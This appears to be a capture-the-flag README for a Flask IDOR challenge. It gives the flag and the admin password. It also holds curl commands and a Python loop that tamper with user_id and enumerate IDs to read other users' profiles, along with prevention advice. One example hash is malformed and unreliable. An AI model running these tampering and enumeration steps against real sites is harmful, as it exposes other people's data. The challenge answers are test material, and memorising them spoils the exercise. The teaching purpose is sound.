# Secure Portal

A web exploitation challenge demonstrating access control vulnerabilities and privilege escalation techniques.

---

## Challenge Info

| Field | Value |
|-------|-------|
| **Name** | Secure Portal |
| **Category** | Web Exploitation |
| **Difficulty** | Medium |
| **Flag** | `DSCCTF{S3CUR3_P0RT4L_BYP4SS_2026}` |
| **Author** | ShadowPB |
| **Port** | 8007 |

---

## Challenge Description

üõ°Ô∏è Welcome to Secure Portal, our advanced user management system! This challenge demonstrates common web application security issues.

You have access to a web application with user profiles. As a regular user, you can see your own profile which contains a partially masked flag. However, the admin user has access to the complete, unmasked flag.

**Your mission**: Access the admin's complete flag without knowing admin credentials.

---

## Files

- `app.py` - Flask web application with access control issues
- `requirements.txt` - Python dependencies (Flask)
- `solve.py` - Complete exploitation script with multiple methods
- `flag.txt` - Target flag
- `description.md` - Challenge description
- `Dockerfile` - Container setup
- `docker-compose.yml` - Easy deployment

---

## Quick Start

### Local Testing
```bash
# Install dependencies
pip install -r requirements.txt

# Run the application
python3 app.py

# Visit http://localhost:8007
```

### Docker Deployment
```bash
# Build and run
docker-compose up -d

# Access at http://localhost:8007
```

### Automated Exploitation
```bash
# Run the complete exploit
python3 solve.py
```

---

## Credentials

### Test User Account
- **Username**: `user`
- **Password**: `password123`

### Admin Account (Unknown Credentials)
- **Username**: `admin`  
- **Password**: `super_secret_admin_password_impossible_to_guess_2026`
- **Goal**: Access admin data without knowing password

---

## Vulnerability Analysis

### What are Access Control Issues?
**Insecure Direct Object Reference** occurs when an application exposes references to internal objects (like user IDs, file names, database keys) without proper authorization checks.

### Vulnerable Code Pattern
```python
@app.route('/profile')
def profile():
    if not session.get('logged_in'):
        return redirect(url_for('index'))
    
    # VULNERABILITY: No authorization check!
    user_id = request.args.get('user_id')  # ‚Üê Controllable by user
    
    if user_id:
        user_id = int(user_id)
        profile_data = users.get(user_id)  # ‚Üê Direct object access
    else:
        profile_data = users.get(session.get('user_id'))
    
    return render_template_string(HTML_TEMPLATE, profile_data=profile_data)
```

### The Problem
- Application trusts user-provided `user_id` parameter
- No check if current user can access requested user ID
- Direct database/object access without authorization layer

---

## Exploitation Techniques

### Method 1: URL Parameter Manipulation
```bash
# Step 1: Login as regular user
curl -c cookies.txt -d "username=user&password=password123" http://localhost:8007/login

# Step 2: Access own profile (user_id=2)
curl -b cookies.txt "http://localhost:8007/profile?user_id=2"
# Shows: DSCCTF{IDOR_‚ñà‚ñà‚ñà‚ñà_‚ñà‚ñà‚ñà‚ñà‚ñà_‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà_‚ñà‚ñà‚ñà‚ñà}

# Step 3: Access control bypass - access admin profile (user_id=1)  
curl -b cookies.txt "http://localhost:8007/profile?user_id=1"
# Shows: DSCCTF{S3CUR3_P0RT4L_BYP4SS_2026}
```

### Method 2: API Endpoint Exploitation
```bash
# Alternative attack via API
curl -b cookies.txt "http://localhost:8007/api/user/1"

# JSON response includes admin flag
{
  "id": 1,
  "username": "admin",
  "email": "admin@ctf.com", 
  "role": "admin",
  "profile": "Administrator with full system access",
  "flag": "DSCCTF{S3CUR3_P0RT4L_BYP4SS_2026}"
}
```

### Method 3: Browser-Based Attack
1. Login with `user:password123`
2. Navigate to your profile: `/profile`
3. Notice URL might show: `/profile?user_id=2`
4. Manually change to: `/profile?user_id=1`
5. View admin's complete flag

---

## Solution Approach

### Step 1: Reconnaissance
- Login as regular user
- Explore application functionality
- Identify URL parameters and data access patterns
- Look for object references in URLs/forms

### Step 2: Identify IDOR Vulnerability
```python
# Notice profile access pattern
/profile                    # Default (current user)
/profile?user_id=2         # Explicit user ID parameter
```

### Step 3: Test Authorization
```bash
# Try accessing other user IDs
/profile?user_id=1         # Admin user
/profile?user_id=3         # Non-existent user
/profile?user_id=0         # Edge case
/profile?user_id=-1        # Negative ID
```

### Step 4: Exploit and Extract Flag
- Successfully access admin profile with `user_id=1`
- Complete flag: `DSCCTF{S3CUR3_P0RT4L_BYP4SS_2026}`
- Document the vulnerability for reporting

---

## Learning Objectives

- **IDOR Identification**: Recognizing insecure object references
- **Parameter Tampering**: Manipulating user-controllable inputs  
- **Authorization Testing**: Verifying access control implementations
- **Privilege Escalation**: Gaining unauthorized access to resources
- **Web Security**: Understanding common application vulnerabilities

---

## IDOR Prevention

### ‚ùå Vulnerable Implementation
```python
# Direct object access without authorization
user_id = request.args.get('user_id')
user_data = database.get_user(user_id)  # No access check!
```

### ‚úÖ Secure Implementation
```python
# Proper authorization check
def get_user_profile(requested_user_id, current_user_id, current_user_role):
    # Check if user can access requested profile
    if current_user_role == 'admin':
        return database.get_user(requested_user_id)
    elif requested_user_id == current_user_id:
        return database.get_user(requested_user_id)
    else:
        raise UnauthorizedError("Access denied")
```

### Best Practices
1. **Implement proper access controls** on all object references
2. **Use session-based authorization** instead of URL parameters
3. **Validate user permissions** before data access
4. **Use indirect references** (session IDs, tokens) instead of direct IDs
5. **Log access attempts** for security monitoring

---

## IDOR Variations

### Horizontal IDOR
```
User A accesses User B's data (same privilege level)
/profile?user_id=123  ‚Üí  /profile?user_id=456
```

### Vertical IDOR  
```
Regular user accesses admin data (privilege escalation)
/profile?user_id=2  ‚Üí  /profile?user_id=1 (admin)
```

### Blind IDOR
```
No direct data exposure, but operations succeed
/delete?file_id=123  ‚Üí  /delete?file_id=456 (other user's file)
```

---

## Testing Methodology

### Manual Testing
1. **Map all object references** in the application
2. **Identify user-controllable parameters** (URL, POST, headers)
3. **Test boundary conditions** (negative IDs, large numbers, special chars)
4. **Try different user contexts** (logged out, different roles)
5. **Monitor responses** for data leakage or error messages

### Automated Testing
```python
# IDOR enumeration script
import requests

session = requests.Session()
# Login first
session.post('/login', data={'username': 'user', 'password': 'pass'})

# Test user ID range
for user_id in range(1, 100):
    response = session.get(f'/profile?user_id={user_id}')
    if response.status_code == 200:
        print(f"Access granted for user_id: {user_id}")
        # Check for sensitive data in response
```

---

## Real-World Impact

### Common Targets
- **User Profiles**: Personal information, settings
- **Financial Records**: Bank statements, transaction history
- **File Systems**: Documents, images, backups
- **Administrative Functions**: User management, system settings

### Business Impact
- **Data Breaches**: Unauthorized access to sensitive information
- **Privacy Violations**: Exposure of personal/confidential data
- **Compliance Issues**: GDPR, HIPAA, PCI-DSS violations
- **Reputation Damage**: Loss of customer trust

---

## Advanced Exploitation

### IDOR with Hash IDs
```python
# Even with hashed IDs, patterns might exist
/profile/5d41402abc4b2a76b9719d911017c592  # MD5 of "hello"
/profile/aaf4c61ddcc5e8a2dabede0f3b482cd9aee  # MD5 of "hello2"
```

### IDOR in JSON APIs
```json
POST /api/users/profile
{
  "user_id": 123,  // ‚Üê Manipulate this field
  "action": "view_profile"
}
```

### IDOR with Encoded References
```
Base64: /profile?id=MTIz (123)
UUID: /profile?id=550e8400-e29b-41d4-a716-446655440000
```

---

## Hints

1. Look for numeric IDs in URLs after logging in
2. Try changing parameter values systematically  
3. Check both web interface and API endpoints
4. Admin users typically have lower ID numbers
5. The `/hint` endpoint provides progressive clues

This challenge demonstrates how a simple missing authorization check can lead to complete privilege escalation and data exposure.